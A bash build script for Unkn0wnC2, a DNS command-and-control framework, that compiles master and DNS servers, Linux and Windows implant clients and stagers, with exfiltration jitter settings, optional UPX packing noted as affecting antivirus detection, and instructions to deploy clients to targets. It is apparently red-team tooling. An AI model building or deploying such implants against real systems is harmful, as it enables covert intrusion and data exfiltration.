#!/bin/bash
#
# ⚠️  LEGACY BUILD SCRIPT - DEPRECATED ⚠️
#
# This is the legacy build script. For production deployments, use:
#
#   sudo bash build_new.sh
#
# The new installer provides:
#   ✅ Package-style installation (/opt/unkn0wnc2/)
#   ✅ Auto-generated secure credentials
#   ✅ Web-based component builder
#   ✅ Runtime configuration (--bind-addr, --bind-port)
#
# This legacy script is kept for backward compatibility and development builds.
#
# ---
#
# Production Build Script for Unkn0wnC2 DNS C2 Framework
# 
# This script builds optimized, stripped binaries for production deployment:
#   - STANDALONE MODE: Single DNS server + clients
#   - DISTRIBUTED MODE: Master server + multiple DNS servers + clients
#
# Supports two deployment modes:
#   1. Standalone (default): Traditional single-server C2
#      - Builds: 1 DNS server, clients, stagers
#      - DNS server runs with interactive console
#
#   2. Distributed: Shadow Mesh architecture
#      - Builds: Master server, N DNS servers (one per domain), clients, stagers
#      - DNS servers connect to master, no console
#      - Clients use multi-domain configuration
#
# BEFORE RUNNING:
#   - Update build_config.json with your domain and network settings
#   - Set deployment.mode to "standalone" or "distributed"
#   - For distributed mode: Configure deployment.dns_servers array and deployment.master
#   - Change encryption_key from default value
#
# USAGE:
#   bash build.sh [--mode standalone|distributed]
#
# OUTPUT:
#   All binaries will be in build/
#

set -e  # Exit on error

VERSION="0.2.0"
BUILD_DATE=$(date -u '+%Y-%m-%d_%H:%M:%S_UTC')
GIT_COMMIT=$(git rev-parse --short HEAD 2>/dev/null || echo "unknown")

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Parse command line arguments
DEPLOYMENT_MODE=""
while [[ $# -gt 0 ]]; do
    case $1 in
        --mode)
            DEPLOYMENT_MODE="$2"
            shift 2
            ;;
        *)
            echo -e "${RED}Unknown argument: $1${NC}"
            echo "Usage: $0 [--mode standalone|distributed]"
            exit 1
            ;;
    esac
done

echo -e "${RED}"
cat << "EOF"
  _    _       _           ___                    _____ ___  
 | |  | |     | |         / _ \                  / ____|__ \ 
 | |  | |_ __ | | ___ __ | | | |_      ___ __   | |       ) |
 | |  | | '_ \| |/ / '_ \| | | \ \ /\ / / '_ \  | |      / / 
 | |__| | | | |   <| | | | |_| |\ V  V /| | | | | |____ / /_ 
  \____/|_| |_|_|\_\_| |_|\___/  \_/\_/ |_| |_|  \_____|____|
EOF
echo -e "${NC}"
echo -e "${GREEN}================================${NC}"
echo -e "${GREEN}Build System${NC}"
echo -e "${GREEN}Version: ${VERSION}${NC}"
echo -e "${GREEN}================================${NC}"
echo ""

# Build flags for maximum optimization and minimal binary size
LDFLAGS="-s -w -X main.version=${VERSION} -X main.buildDate=${BUILD_DATE} -X main.gitCommit=${GIT_COMMIT}"
BUILDFLAGS="-trimpath"

# Remove old artifacts and create new build directory
rm -rf build
mkdir -p build

# Check if build_config.json exists
if [ ! -f "build_config.json" ]; then
    echo -e "${RED}Error: build_config.json not found${NC}"
    exit 1
fi

# Detect deployment mode from config if not specified
if [ -z "$DEPLOYMENT_MODE" ]; then
    if command -v jq &> /dev/null; then
        DEPLOYMENT_MODE=$(jq -r '.deployment.mode // "standalone"' build_config.json)
    else
        DEPLOYMENT_MODE="standalone"
    fi
fi

echo -e "${BLUE}Deployment Mode: ${DEPLOYMENT_MODE^^}${NC}"
echo ""

echo -e "${BLUE}Deployment Mode: ${DEPLOYMENT_MODE^^}${NC}"
echo ""

if [ "$DEPLOYMENT_MODE" == "distributed" ]; then
    echo -e "${CYAN}Building for distributed (Shadow Mesh) deployment:${NC}"
    if command -v jq &> /dev/null; then
        NUM_DNS_SERVERS=$(jq -r '.deployment.dns_servers | length' build_config.json)
        DNS_DOMAINS=$(jq -r '.deployment.dns_servers[].domain' build_config.json | tr '\n' ', ' | sed 's/,$//')
        echo "  Master Server: Enabled"
        echo "  DNS Servers:   ${NUM_DNS_SERVERS} (${DNS_DOMAINS})"
        echo "  Clients:       Multi-domain support"
    fi
elif [ "$DEPLOYMENT_MODE" == "standalone" ]; then
    echo -e "${CYAN}Building for standalone deployment:${NC}"
    if command -v jq &> /dev/null; then
        DOMAIN=$(jq -r '.server.domain' build_config.json)
        echo "  DNS Server:    1 (${DOMAIN})"
        echo "  Clients:       Single-domain"
    fi
else
    echo -e "${RED}Error: Invalid deployment mode '${DEPLOYMENT_MODE}'${NC}"
    echo "Valid modes: standalone, distributed"
    exit 1
fi
echo ""

# Function to build DNS server with specific configuration
build_dns_server() {
    local SERVER_ID=$1
    local SERVER_CONFIG=$2
    local OUTPUT_NAME=$3
    
    echo -e "${YELLOW}Building DNS Server: ${SERVER_ID}${NC}"
    
    # Create temporary config for this server
    echo "$SERVER_CONFIG" > /tmp/server_build_config.json
    
    cd Server
    GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o "../build/${OUTPUT_NAME}" .
    cd ..
    
    echo -e "${GREEN}  ✓ ${OUTPUT_NAME}: $(du -h build/${OUTPUT_NAME} | cut -f1)${NC}"
}

echo -e "${YELLOW}[1/7] Embedding configuration from build_config.json...${NC}"
# Only embed configuration into source files, don't build yet
cd tools/builder
go build -o ../../build-tool .
cd ../..

echo "  Running builder tool to embed configuration..."
# Note: Builder tool outputs binaries to build/ dir, but we'll rebuild with optimizations
./build-tool > /dev/null 2>&1

# Clean up builder's output since we'll rebuild with optimizations - will fix builder on later update to avoid this
rm -rf build/dns-server-linux build/dns-client-linux build/dns-client-windows.exe build/deployment_info.json 2>/dev/null || true

# Clean up build-tool
rm -f build-tool build-tool.exe
echo -e "${GREEN}Configuration embedded into source files${NC}"
echo ""

if [ "$DEPLOYMENT_MODE" == "distributed" ]; then
    echo -e "${YELLOW}[2/7] Generating Configuration Files...${NC}"
    
    # Create configs directory
    mkdir -p build/configs
    
    # Generate Master Server config from build_config.json
    echo "  Generating master_config.json..."
    if command -v jq &> /dev/null; then
        # Build dns_servers array with unique API keys
        DNS_SERVERS_CONFIG="["
        NUM_SERVERS=$(jq -r '.deployment.dns_servers | length' build_config.json)
        
        for (( i=0; i<$NUM_SERVERS; i++ )); do
            SERVER_ID=$(jq -r ".deployment.dns_servers[$i].id" build_config.json)
            DOMAIN=$(jq -r ".deployment.dns_servers[$i].domain" build_config.json)
            BIND_ADDR=$(jq -r ".deployment.dns_servers[$i].bind_addr" build_config.json)
            
            # Generate unique API key for this DNS server (32 random hex chars)
            API_KEY=$(openssl rand -hex 16 2>/dev/null || cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 32 | head -n 1)
            
            if [ $i -gt 0 ]; then
                DNS_SERVERS_CONFIG+=","
            fi
            DNS_SERVERS_CONFIG+="{\"id\":\"${SERVER_ID}\",\"domain\":\"${DOMAIN}\",\"api_key\":\"${API_KEY}\",\"address\":\"${BIND_ADDR}\",\"enabled\":true}"
            
            # Store API key for DNS server config generation
            echo "${API_KEY}" > /tmp/api_key_${SERVER_ID}
        done
        DNS_SERVERS_CONFIG+="]"
        
        # Create master config
        jq -n \
            --arg bind_addr "$(jq -r '.deployment.master.bind_addr' build_config.json)" \
            --argjson bind_port "$(jq -r '.deployment.master.bind_port' build_config.json)" \
            --arg tls_cert "$(jq -r '.deployment.master.tls_cert' build_config.json)" \
            --arg tls_key "$(jq -r '.deployment.master.tls_key' build_config.json)" \
            --arg jwt_secret "$(jq -r '.deployment.master.jwt_secret' build_config.json)" \
            --argjson session_timeout "$(jq -r '.deployment.master.session_timeout' build_config.json)" \
            --arg database_path "$(jq -r '.deployment.master.database_path' build_config.json)" \
            --arg admin_username "$(jq -r '.deployment.master.admin_username' build_config.json)" \
            --arg admin_password "$(jq -r '.deployment.master.admin_password' build_config.json)" \
            --argjson debug "$(jq -r '.deployment.master.debug' build_config.json)" \
            --argjson dns_servers "$DNS_SERVERS_CONFIG" \
            '{
                bind_addr: $bind_addr,
                bind_port: $bind_port,
                tls_cert: $tls_cert,
                tls_key: $tls_key,
                jwt_secret: $jwt_secret,
                session_timeout: $session_timeout,
                database_path: $database_path,
                admin_credentials: {
                    username: $admin_username,
                    password: $admin_password
                },
                debug: $debug,
                dns_servers: $dns_servers
            }' > build/configs/master_config.json
        
        echo -e "${GREEN}    ✓ build/configs/master_config.json${NC}"
        
        # Generate DNS Server configs
        # Use public_url if available, otherwise construct from bind_addr
        MASTER_PUBLIC_URL=$(jq -r '.deployment.master.public_url // empty' build_config.json)
        if [ -z "$MASTER_PUBLIC_URL" ]; then
            MASTER_URL="https://$(jq -r '.deployment.master.bind_addr' build_config.json):$(jq -r '.deployment.master.bind_port' build_config.json)"
        else
            MASTER_URL="$MASTER_PUBLIC_URL"
        fi
        
        for (( i=0; i<$NUM_SERVERS; i++ )); do
            SERVER_ID=$(jq -r ".deployment.dns_servers[$i].id" build_config.json)
            API_KEY=$(cat /tmp/api_key_${SERVER_ID})
            
            echo "  Generating config for ${SERVER_ID}..."
            
            # Create DNS server config
            jq -n \
                --arg bind_addr "$(jq -r ".deployment.dns_servers[$i].bind_addr" build_config.json)" \
                --argjson bind_port "$(jq -r ".deployment.dns_servers[$i].bind_port" build_config.json)" \
                --arg domain "$(jq -r ".deployment.dns_servers[$i].domain" build_config.json)" \
                --arg ns1 "$(jq -r ".deployment.dns_servers[$i].ns1" build_config.json)" \
                --arg ns2 "$(jq -r ".deployment.dns_servers[$i].ns2" build_config.json)" \
                --argjson forward_dns "$(jq -r ".deployment.dns_servers[$i].forward_dns" build_config.json)" \
                --arg upstream_dns "$(jq -r ".deployment.dns_servers[$i].upstream_dns" build_config.json)" \
                --argjson debug "$(jq -r ".deployment.dns_servers[$i].debug" build_config.json)" \
                --arg master_server "$MASTER_URL" \
                --arg master_api_key "$API_KEY" \
                --arg master_server_id "$SERVER_ID" \
                '{
                    bind_addr: $bind_addr,
                    bind_port: $bind_port,
                    domain: $domain,
                    ns1: $ns1,
                    ns2: $ns2,
                    forward_dns: $forward_dns,
                    upstream_dns: $upstream_dns,
                    debug: $debug,
                    master_server: $master_server,
                    master_api_key: $master_api_key,
                    master_server_id: $master_server_id
                }' > "build/configs/dns_server_${SERVER_ID}_config.json"
            
            echo -e "${GREEN}    ✓ build/configs/dns_server_${SERVER_ID}_config.json${NC}"
            
            # Clean up temp file
            rm -f /tmp/api_key_${SERVER_ID}
        done
    else
        echo -e "${RED}Error: jq is required for distributed builds${NC}"
        echo "Install with: apt install jq"
        exit 1
    fi
    echo ""
    
    echo -e "${YELLOW}[3/7] Generating TLS Certificates...${NC}"
    
    # Create certs directory
    mkdir -p build/certs
    
    # Check if certificates already exist
    if [ -f "build/certs/master.crt" ] && [ -f "build/certs/master.key" ]; then
        echo -e "${GREEN}  ✓ TLS certificates already exist${NC}"
    else
        echo "  Generating self-signed TLS certificate for master server..."
        
        # Check if openssl is available
        if command -v openssl &> /dev/null; then
            MASTER_ADDR=$(jq -r '.deployment.master.bind_addr' build_config.json)
            
            # Generate self-signed certificate
            openssl req -x509 -newkey rsa:4096 -nodes \
                -keyout build/certs/master.key \
                -out build/certs/master.crt \
                -days 365 \
                -subj "/C=US/ST=State/L=City/O=Unkn0wnC2/CN=${MASTER_ADDR}" \
                2>/dev/null
            
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}  ✓ Generated master.crt and master.key (valid for 365 days)${NC}"
            else
                echo -e "${RED}  ✗ Failed to generate certificates${NC}"
                exit 1
            fi
        else
            echo -e "${RED}  ✗ openssl not found - cannot generate certificates${NC}"
            echo "    Install openssl: apt install openssl"
            exit 1
        fi
    fi
    
    # Copy master config to build directory for easy deployment
    cp build/configs/master_config.json build/master_config.json
    echo -e "${GREEN}  ✓ Copied master_config.json to build directory${NC}"
    echo ""
    
    echo -e "${YELLOW}[4/7] Building Master Server...${NC}"
    cd Master
    GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/master-server-linux .
    echo -e "${GREEN}Master server built: $(du -h ../build/master-server-linux | cut -f1)${NC}"
    cd ..
    
    # Copy web interface files
    echo -e "${YELLOW}Copying web interface files...${NC}"
    mkdir -p build/web
    cp -r Master/web/* build/web/
    echo -e "${GREEN}Web interface files copied${NC}"
    echo ""
    
    echo -e "${YELLOW}[5/8] Building DNS Servers (Distributed Mode)...${NC}"
    if command -v jq &> /dev/null; then
        # Build a DNS server for each domain in deployment.dns_servers
        NUM_SERVERS=$(jq -r '.deployment.dns_servers | length' build_config.json)
        
        # Get master server URL - use public_url if available, otherwise construct from bind_addr
        MASTER_PUBLIC_URL=$(jq -r '.deployment.master.public_url // empty' build_config.json)
        if [ -z "$MASTER_PUBLIC_URL" ]; then
            MASTER_BIND_ADDR=$(jq -r '.deployment.master.bind_addr' build_config.json)
            MASTER_BIND_PORT=$(jq -r '.deployment.master.bind_port' build_config.json)
            MASTER_URL="https://${MASTER_BIND_ADDR}:${MASTER_BIND_PORT}"
        else
            MASTER_URL="$MASTER_PUBLIC_URL"
        fi
        
        echo "  Master Server URL: ${MASTER_URL}"
        
        # Back up the original Server/config.go
        cp Server/config.go Server/config.go.backup
        
        for (( i=0; i<$NUM_SERVERS; i++ )); do
            SERVER_ID=$(jq -r ".deployment.dns_servers[$i].id" build_config.json)
            DOMAIN=$(jq -r ".deployment.dns_servers[$i].domain" build_config.json)
            BIND_ADDR=$(jq -r ".deployment.dns_servers[$i].bind_addr" build_config.json)
            BIND_PORT=$(jq -r ".deployment.dns_servers[$i].bind_port" build_config.json)
            SVR_ADDR=$(jq -r ".deployment.dns_servers[$i].server_address // .deployment.dns_servers[$i].bind_addr" build_config.json)
            NS1=$(jq -r ".deployment.dns_servers[$i].ns1" build_config.json)
            NS2=$(jq -r ".deployment.dns_servers[$i].ns2" build_config.json)
            FORWARD_DNS=$(jq -r ".deployment.dns_servers[$i].forward_dns" build_config.json)
            UPSTREAM_DNS=$(jq -r ".deployment.dns_servers[$i].upstream_dns" build_config.json)
            DEBUG=$(jq -r ".deployment.dns_servers[$i].debug" build_config.json)
            
            # Get API key from generated config
            API_KEY=$(jq -r ".dns_servers[$i].api_key" build/configs/master_config.json)
            
            echo "  Building DNS Server: ${SERVER_ID} (${DOMAIN}) - Binding to ${BIND_ADDR}:${BIND_PORT}"
            
            # Update the embedded config in config.go for this specific server
            # Use [[:space:]]* to match any whitespace (tabs or spaces)
            sed -i.tmp \
                -e "s/BindAddr:[[:space:]]*\"[^\"]*\"/BindAddr:      \"${BIND_ADDR}\"/" \
                -e "s/BindPort:[[:space:]]*[0-9]*/BindPort:      ${BIND_PORT}/" \
                -e "s/SvrAddr:[[:space:]]*\"[^\"]*\"/SvrAddr:       \"${SVR_ADDR}\"/" \
                -e "s/Domain:[[:space:]]*\"[^\"]*\"/Domain:        \"${DOMAIN}\"/" \
                -e "s/NS1:[[:space:]]*\"[^\"]*\"/NS1:           \"${NS1}\"/" \
                -e "s/NS2:[[:space:]]*\"[^\"]*\"/NS2:           \"${NS2}\"/" \
                -e "s/ForwardDNS:[[:space:]]*[a-z]*/ForwardDNS:    ${FORWARD_DNS}/" \
                -e "s/UpstreamDNS:[[:space:]]*\"[^\"]*\"/UpstreamDNS:   \"${UPSTREAM_DNS}\"/" \
                -e "s/Debug:[[:space:]]*[a-z]*/Debug:         ${DEBUG}/" \
                -e "s|MasterServer:[[:space:]]*\"[^\"]*\"|MasterServer:   \"${MASTER_URL}\"|" \
                -e "s/MasterAPIKey:[[:space:]]*\"[^\"]*\"/MasterAPIKey:   \"${API_KEY}\"/" \
                -e "s/MasterServerID:[[:space:]]*\"[^\"]*\"/MasterServerID: \"${SERVER_ID}\"/" \
                Server/config.go
            rm -f Server/config.go.tmp
            
            # Build server with updated embedded config
            cd Server
            GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o "../build/dns-server-${SERVER_ID}" .
            cd ..
            
            echo -e "${GREEN}    ✓ dns-server-${SERVER_ID}: $(du -h build/dns-server-${SERVER_ID} | cut -f1)${NC}"
            
            # Restore original config.go for next iteration
            cp Server/config.go.backup Server/config.go
        done
        
        # Clean up backup
        rm -f Server/config.go.backup
    else
        echo -e "${RED}Error: jq is required for distributed builds${NC}"
        echo "Install with: apt install jq"
        exit 1
    fi
    echo ""
    
    # Update client config with all DNS domains
    echo -e "${YELLOW}[6/8] Configuring clients for multi-domain...${NC}"
    if command -v jq &> /dev/null; then
        # Extract all domains and create dns_domains array
        DNS_DOMAINS_JSON=$(jq -c '[.deployment.dns_servers[].domain]' build_config.json)
        
        # Update build_config.json client.dns_domains
        jq ".client.dns_domains = $DNS_DOMAINS_JSON" build_config.json > build_config.tmp.json
        mv build_config.tmp.json build_config.json
        
        echo -e "${GREEN}  Configured clients with $(echo $DNS_DOMAINS_JSON | jq '. | length') domains${NC}"
    fi
    echo ""
else
    echo -e "${YELLOW}[2/5] Building Server (Linux) with optimizations...${NC}"
    cd Server
    GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/dns-server-linux .
    echo -e "${GREEN}Server built: $(du -h ../build/dns-server-linux | cut -f1)${NC}"
    cd ..
    echo ""
fi

# Set step counters based on mode
if [ "$DEPLOYMENT_MODE" == "distributed" ]; then
    CLIENT_STEP="7/8"
    STAGER_STEP="8/8"
else
    CLIENT_STEP="3/5"
    STAGER_STEP="4/5"
fi

echo -e "${YELLOW}[$CLIENT_STEP] Regenerating Client configuration...${NC}"
cd Client/tools
go run generate_config.go
cd ../..
echo -e "${GREEN}Client config.go regenerated from build_config.json${NC}"
echo ""

echo -e "${YELLOW}[$CLIENT_STEP] Building Client (Linux)...${NC}"
cd Client
GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/dns-client-linux .
echo -e "${GREEN}Linux client built: $(du -h ../build/dns-client-linux | cut -f1)${NC}"
cd ..
echo ""

echo -e "${YELLOW}[$CLIENT_STEP] Building Client (Windows)...${NC}"
cd Client
GOOS=windows GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/dns-client-windows.exe .
echo -e "${GREEN}Windows client built: $(du -h ../build/dns-client-windows.exe | cut -f1)${NC}"
cd ..
echo ""

echo -e "${YELLOW}[$STAGER_STEP] Building Stager (Linux) with jitter config...${NC}"
echo ""

# Show stager config being compiled
if command -v jq &> /dev/null && [ -f "build_config.json" ]; then
    STAGER_JITTER_MIN=$(jq -r '.stager.jitter_min_ms // 100' build_config.json)
    STAGER_JITTER_MAX=$(jq -r '.stager.jitter_max_ms // 500' build_config.json)
    STAGER_CHUNKS=$(jq -r '.stager.chunks_per_burst // 10' build_config.json)
    STAGER_BURST=$(jq -r '.stager.burst_pause_ms // 2000' build_config.json)
    RETRY_DELAY=$(jq -r '.stager.retry_delay_seconds // 3' build_config.json)
    MAX_RETRIES=$(jq -r '.stager.max_retries // 5' build_config.json)
    
    # Convert to seconds for display
    JITTER_MIN_S=$(( STAGER_JITTER_MIN / 1000 ))
    JITTER_MAX_S=$(( STAGER_JITTER_MAX / 1000 ))
    BURST_S=$(( STAGER_BURST / 1000 ))
    
    # Calculate total delay range (jitter + burst pause)
    TOTAL_MIN_S=$(( (STAGER_JITTER_MIN + STAGER_BURST) / 1000 ))
    TOTAL_MAX_S=$(( (STAGER_JITTER_MAX + STAGER_BURST) / 1000 ))
    
    # Calculate estimated download time for 100 chunks
    EXAMPLE_CHUNKS=100
    NUM_BURSTS=$(( (EXAMPLE_CHUNKS + STAGER_CHUNKS - 1) / STAGER_CHUNKS ))
    AVG_DELAY_MS=$(( (STAGER_JITTER_MIN + STAGER_JITTER_MAX) / 2 ))
    TOTAL_DELAY_MS=$(( NUM_BURSTS * (AVG_DELAY_MS + STAGER_BURST) ))
    EST_TIME_S=$(( (EXAMPLE_CHUNKS + TOTAL_DELAY_MS) / 1000 ))
    EST_MIN=$(( EST_TIME_S / 60 ))
    EST_SEC=$(( EST_TIME_S % 60 ))
    
    echo "  Stager Timing Configuration:"
    echo "  ────────────────────────────────────────"
    echo "  Jitter Range:        ${JITTER_MIN_S}s - ${JITTER_MAX_S}s"
    echo "  Chunks Per Burst:    ${STAGER_CHUNKS}"
    echo "  Burst Pause:         ${BURST_S}s"
    echo "  Total Delay/Burst:   ${TOTAL_MIN_S}s - ${TOTAL_MAX_S}s"
    echo "  Retry Delay:         ${RETRY_DELAY}s"
    echo "  Max Retries:         ${MAX_RETRIES}"
    echo "  Est. Download Time:  ${EST_MIN}m ${EST_SEC}s (100 chunks)"
    echo ""
fi

cd Stager
make clean > /dev/null 2>&1 || true

# Build stager (show output for debugging)
bash build.sh

# Check if binaries were created
if [ -f "../build/stager/stager-linux-x64" ]; then
    echo -e "${GREEN}Stagers built:${NC}" 
    echo -e " Linux: $(du -h ../build/stager/stager-linux-x64 | cut -f1)"
    
    if [ -f "../build/stager/stager-windows-x64.exe" ]; then
        echo -e " Windows: $(du -h ../build/stager/stager-windows-x64.exe | cut -f1)"
    fi
else
    echo -e "${RED}Error: Stager build failed - binaries not found${NC}"
    cd ..
    exit 1
fi

cd ..

echo ""
echo -e "${GREEN}================================${NC}"
echo -e "${GREEN}Optional: UPX Compression${NC}"
echo -e "${GREEN}================================${NC}"
if command -v upx &> /dev/null; then
    read -p "Apply UPX compression? (reduces size but adds signatures that may trigger AV) [y/N]: " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo "  Compressing binaries with UPX..."
        upx --lzma --best build/dns-client-linux 2>/dev/null || true
        upx --lzma --best build/dns-client-windows.exe 2>/dev/null || true
        upx --lzma --best build/stager/stager-linux-x64 2>/dev/null || true
        upx --lzma --best build/stager/stager-windowsx-x64 2>/dev/null || true
        echo -e "${GREEN}  UPX compression complete${NC}"
    else
        echo "  Skipping UPX compression (better for OPSEC)"
    fi
else
    echo "  UPX not found - skipping compression (install with: apt install upx-ucl/pacman -S upx)"
fi

echo ""
echo -e "${GREEN}================================${NC}"
echo -e "${GREEN}Build Complete!${NC}"
echo -e "${GREEN}================================${NC}"
echo ""

if [ "$DEPLOYMENT_MODE" == "distributed" ]; then
    echo -e "${BLUE}DISTRIBUTED DEPLOYMENT ARTIFACTS:${NC}"
    echo "────────────────────────────────────────"
    echo ""
    echo "Master Server:"
    echo "  build/master-server-linux"
    echo "  build/web/ (web interface files)"
    echo ""
    echo "DNS Servers:"
    if command -v jq &> /dev/null; then
        NUM_SERVERS=$(jq -r '.deployment.dns_servers | length' build_config.json)
        for (( i=0; i<$NUM_SERVERS; i++ )); do
            SERVER_ID=$(jq -r ".deployment.dns_servers[$i].id" build_config.json)
            DOMAIN=$(jq -r ".deployment.dns_servers[$i].domain" build_config.json)
            echo "  build/dns-server-${SERVER_ID} → ${DOMAIN}"
        done
    fi
    echo ""
    echo "Clients (Multi-Domain):"
    echo "  build/dns-client-linux"
    echo "  build/dns-client-windows.exe"
    echo ""
    echo "Stagers:"
    echo "  build/stager/stager-linux-x64"
    if [ -f "build/stager/stager-windows-x64.exe" ]; then
        echo "  build/stager/stager-windows-x64.exe"
    fi
    echo ""
    echo -e "${YELLOW}DEPLOYMENT INSTRUCTIONS:${NC}"
    echo "────────────────────────────────────────"
    echo "1. Deploy master-server-linux + web/ folder on central command server"
    echo "2. Generate TLS certificates for master server (see Master/README.md)"
    echo "3. Access web interface at https://<master-ip>:8443/"
    echo "4. Deploy each dns-server-* to respective authoritative DNS servers"
    echo "5. Configure each DNS server's config.json with:"
    echo "   - master_server: https://<master-ip>:8443"
    echo "   - master_api_key: <from master config>"
    echo "   - master_server_id: <server-id>"
    echo "6. Deploy clients to targets (will rotate through all DNS domains)"
    echo ""
else
    echo -e "${BLUE}STANDALONE DEPLOYMENT ARTIFACTS:${NC}"
    echo "────────────────────────────────────────"
    echo ""
    echo "DNS Server:"
    echo "  build/dns-server-linux"
    echo ""
    echo "Clients:"
    echo "  build/dns-client-linux"
    echo "  build/dns-client-windows.exe"
    echo ""
    echo "Stagers:"
    echo "  build/stager/stager-linux-x64"
    if [ -f "build/stager/stager-windows-x64.exe" ]; then
        echo "  build/stager/stager-windows-x64.exe"
    fi
    echo ""
fi

echo "Build artifacts in: build/"
echo ""
ls -lhR build/
echo ""

# Show compiled configuration summary
if command -v jq &> /dev/null && [ -f "build_config.json" ]; then
    echo -e "${YELLOW}COMPILED CONFIGURATION SUMMARY:${NC}"
    echo "────────────────────────────────────────"
    echo ""
    echo "Server Configuration:"
    jq -r '.server | "  Domain:     \(.domain)\n  Bind:       \(.bind_addr):\(.bind_port)\n  NS Records: \(.ns1), \(.ns2)\n  Forward DNS: \(.forward_dns)"' build_config.json
    echo ""
    
    echo "Client Timing Configuration:"
    CLIENT_SLEEP_MIN=$(jq -r '.client.sleep_min' build_config.json)
    CLIENT_SLEEP_MAX=$(jq -r '.client.sleep_max' build_config.json)
    EXFIL_JITTER_MIN=$(jq -r '.client.exfil_jitter_min_ms' build_config.json)
    EXFIL_JITTER_MAX=$(jq -r '.client.exfil_jitter_max_ms' build_config.json)
    EXFIL_CHUNKS=$(jq -r '.client.exfil_chunks_per_burst' build_config.json)
    EXFIL_PAUSE=$(jq -r '.client.exfil_burst_pause_ms' build_config.json)
    
    EXFIL_JITTER_MIN_S=$(( EXFIL_JITTER_MIN / 1000 ))
    EXFIL_JITTER_MAX_S=$(( EXFIL_JITTER_MAX / 1000 ))
    EXFIL_PAUSE_S=$(( EXFIL_PAUSE / 1000 ))
    
    echo "  Check-in Interval:    ${CLIENT_SLEEP_MIN}s - ${CLIENT_SLEEP_MAX}s"
    echo "  Exfil Jitter:         ${EXFIL_JITTER_MIN_S}s - ${EXFIL_JITTER_MAX_S}s"
    echo "  Exfil Chunks/Burst:   ${EXFIL_CHUNKS}"
    echo "  Exfil Burst Pause:    ${EXFIL_PAUSE_S}s"
    echo ""
    
    echo "Stager Timing Configuration:"
    STAGER_MIN=$(jq -r '.stager.jitter_min_ms' build_config.json)
    STAGER_MAX=$(jq -r '.stager.jitter_max_ms' build_config.json)
    STAGER_CHUNKS=$(jq -r '.stager.chunks_per_burst' build_config.json)
    STAGER_BURST=$(jq -r '.stager.burst_pause_ms' build_config.json)
    
    STAGER_MIN_S=$(( STAGER_MIN / 1000 ))
    STAGER_MAX_S=$(( STAGER_MAX / 1000 ))
    STAGER_BURST_S=$(( STAGER_BURST / 1000 ))
    
    echo "  Jitter Range:         ${STAGER_MIN_S}s - ${STAGER_MAX_S}s"
    echo "  Chunks Per Burst:     ${STAGER_CHUNKS}"
    echo "  Burst Pause:          ${STAGER_BURST_S}s"
    echo ""
fi